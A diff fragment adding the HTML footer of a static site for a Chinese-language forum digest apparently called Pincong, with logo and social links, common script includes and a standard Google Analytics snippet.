+<div class="row justify-content-between align-items-center">
+<div class="col-lg-4 text-center text-lg-left mb-4 mb-lg-0">
+<a href=https://project-gutenberg.github.io/Pincong/><img src=https://project-gutenberg.github.io/Pincong//images/logo.png class=img-fluid alt=品葱*精选></a>
+</div>
+<div class="col-lg-4 text-center mb-4 mb-lg-0">
+<ul class="list-inline mb-0">
+</ul>
+</div>
+<div class="col-lg-4 text-lg-right text-center mb-4 mb-lg-0">
+<ul class="list-inline social-icon mb-0">
+<li class=list-inline-item><a href=https://pincong.rocks/><i class=ti-home></i></a></li>
+<li class=list-inline-item><a href=https://github.com/Project-Gutenberg/Pincong><i class=ti-github></i></a></li>
+</ul>
+</div>
+<div class="col-12 text-center mt-4">
+<span></span>
+</div>
+</div>
+</div>
+</footer>
+<script src=../../plugins/jQuery/jquery.min.js></script>
+<script src=../../plugins/bootstrap/bootstrap.min.js></script>
+<script src=../../plugins/search/fuse.min.js></script>
+<script src=../../plugins/search/mark.js></script>
+<script src=../../plugins/search/search.js></script>
+<script src=https://project-gutenberg.github.io/Pincong/js/script.min.js></script>
+<script>(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)})(window,document,'script','//www.google-analytics.com/analytics.js','ga'),ga('create','UA-151212685-6','auto'),ga('send','pageview')</script></body>
+</html>
